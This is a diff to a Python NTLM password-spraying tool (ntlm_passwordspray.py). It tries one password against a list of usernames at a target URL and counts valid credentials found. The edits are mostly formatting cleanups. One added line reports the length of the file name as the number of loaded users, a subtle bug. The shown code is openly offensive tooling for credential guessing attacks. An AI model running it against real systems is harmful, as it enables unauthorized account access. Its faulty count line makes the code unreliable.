@@ -24,10 +24,12 @@ class NTLMSprayer:
         self.fqdn = fqdn
 
     def load_users(self, userfile):
-        self.users = []
-        lines = open(userfile, 'r').readlines()
+        # load the contents of userfile into a list:
+        self.users: list = []
+        lines = open(userfile, 'r', encoding="utf-8").readlines()
         for line in lines:
             self.users.append(line.replace("\r", "").replace("\n", ""))
+        print(f"[=] Loaded wordlist {userfile} for: {len(userfile)} items.\n")
 
     def password_spray(self, password, url):
         print("[i] Starting NTLM password spray attack using the following password: " + password)
@@ -41,7 +43,7 @@ class NTLMSprayer:
             if self.verbose:
                 if response.status_code == self.HTTP_AUTH_FAILED_CODE:
                     print("[-] Failed login with Username: " + user)
-        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
+        print("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
 
 
 def main(argv):
@@ -54,12 +56,12 @@ def main(argv):
     try:
         opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
     except getopt.GetoptError:
-        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        print("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
         sys.exit(2)
 
     for opt, arg in opts:
         if opt == '-h':
-            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+            print("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
             sys.exit()
         elif opt in ("-u", "--userfile"):
             userfile = str(arg)
@@ -78,7 +80,7 @@ def main(argv):
         sys.exit()
     else:
         # Nay, something looks fishy, print usage and exit...
-        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        print("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
         sys.exit(2)
 
 
